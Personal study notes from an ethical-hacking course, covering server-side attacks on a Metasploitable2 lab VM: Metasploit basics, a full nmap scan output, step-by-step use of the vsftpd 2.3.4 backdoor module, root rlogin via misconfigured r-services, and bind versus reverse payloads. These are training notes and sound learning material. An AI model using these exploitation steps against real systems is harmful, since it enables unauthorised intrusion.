---
title: "Learn Ethical Hacking From Scratch"
date: 2023-12-27T09:34:39+01:00
# weight: 1
# bookFlatSection: true
# bookToc: false
# bookHidden: true
# bookCollapseSection: true
# bookComments: true
# bookSearchExclude: true
---
<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/>

## Server side attacks
### Metasploitable2 - Metasploit framework
- Metasploitable2:username/password: msfadmin

### Metasploit framework
- Metasploit is an exploit development and execution tool. It can also be used to carry out other penetration testing tasks such as port scans, service identification and port exploitation tasks.
- Use:
  - msfconsole -  runs the metasploit console
  - help - shows help
  - show [something] - something can be exploits, payload or auxiliary
  - use [something] - use a certain exploit, payload or auxiliary
  - set [option][value] - configure [option] to have a value of [value]
  - exploit - runs the current task

Example
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST 192.168.222.138
show options # show agains
exploit
```
### Server side attacks
- Need an IP address:
  - If target is on the same network: netdiscover or zenmap
  - If target has a domain, then ping them to return its IP
- As long as we can ping them, we can use server-side attacks.
- If target is a personal computer and connect via a private network, the IP might be useless as it maybe the router IP, not the target. In this case, we need to use client side attacks as reverse connection can be used

### Information gathering
- Try default password (ssh ipad case)
- Mis-configured services. Ex: "r" service, ports 512, 513, 514
- Some might contain a back door
- Code execution vulnerabilities

#### Zenmap
- Installation: <https://nmap.org/book/inst-linux.html>
  - Download rmp file
  - Install `alien`: `sudo apt install alien`
  - Convert `rpm` to `deb`: `sudo alien zenmap...rpm`
  - Install `deb`: `sudo dpkg --install zenmap...deb`

- Scan: put the IP of the target.
  - If you are in the same network, you can put your base ip address (`.1`) with `/24`.

```txt
Nmap scan report for 192.168.222.138
Host is up (0.0013s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.222.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9:ad90:6c8f:2f73:74af:383b:2540:8828
|_SHA-1: ed09:3088:7066:03bf:d5dc:2373:99b4:98da:2d4d:31c6
|_ssl-date: 2023-12-27T09:40:23+00:00; +6s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      32875/tcp   mountd
|   100005  1,2,3      38085/udp   mountd
|   100021  1,3,4      50494/udp   nlockmgr
|   100021  1,3,4      54466/tcp   nlockmgr
|   100024  1          34864/tcp   status
|_  100024  1          51322/udp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 37
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, LongColumnFlag, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression
|   Status: Autocommit
|_  Salt: ?hq!M>/oa{gq#WoFQECb
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9:ad90:6c8f:2f73:74af:383b:2540:8828
|_SHA-1: ed09:3088:7066:03bf:d5dc:2373:99b4:98da:2d4d:31c6
|_ssl-date: 2023-12-27T09:40:40+00:00; +5s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h15m05s, deviation: 2h30m00s, median: 4s
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2023-12-27T04:40:13-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.05 seconds
```
### Exploit
search the name of service with the word "exploit"
for example
`netkit-rsh exploit`
`Samba 3.X exploit`
Perhap with the name `rapid7` (the person writes metasploit)
#### netkit-rsh
Misconfiguration:
- `512/tcp exec netkit-rsh rexecd`: By searching google, we know that it is a remote code execution. We install `rsh-client` and use command `rlogin` to login

```bash
rlogin -i root <ip-metasploitable
```

#### FTP vsftpd 2.3.4 backdoor
- `21/tcp ftp`: anonymous FTP login allowed. Search the version `vsftpd 2.3.4` we know that there is a backdoor installed here.
- By searching in the internet, we will use a module from metasploit

```bash
msfconsole
search vsftpd #show what module we will use
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST 192.168.222.138
show options # show agains
exploit
```

### netbios-ssn Samba smbd 3.X-4.X

This time we need to add a payload also. `show payloads`
- bind: open a port on target pc and we connect to that port
- reverse: open a port on the attacker machine then connect from target pc to attacker pc. This allows to bypass firewall on target pc. We also need to config firewall to allow port on our pc (ex: `sudo ufw allow 4444`).


### Nexpose
- Vulnerabiylity Management Framework